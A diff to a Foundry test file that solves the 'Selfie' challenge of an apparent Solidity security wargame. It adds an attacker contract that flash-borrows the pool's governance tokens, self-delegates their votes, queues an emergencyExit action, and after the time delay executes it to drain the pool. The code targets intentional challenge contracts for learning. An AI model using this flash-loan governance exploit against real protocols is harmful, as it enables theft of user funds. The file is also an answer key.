@@ -3,9 +3,47 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    DamnValuableVotes private immutable token;
+    SimpleGovernance private immutable governance;
+    SelfiePool private immutable pool;
+    address private immutable recovery;
+
+    uint256 internal actionId;
+
+    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
+        token = _token;
+        governance = _governance;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
+    }
+
+    function execute() external {
+        governance.executeAction(actionId);
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
+        token.delegate(address(this));
+
+        bytes memory data = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
+        actionId = governance.queueAction(address(pool), 0, data);
+
+        IERC20(address(token)).approve(address(pool), amount);
+        return CALLBACK_SUCCESS;
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +100,12 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttacker attacker = new SelfieAttacker(token, governance, pool, recovery);
+
+        attacker.attack();
+
+        vm.warp(block.timestamp + governance.getActionDelay());
+        attacker.execute();
     }
 
     /**
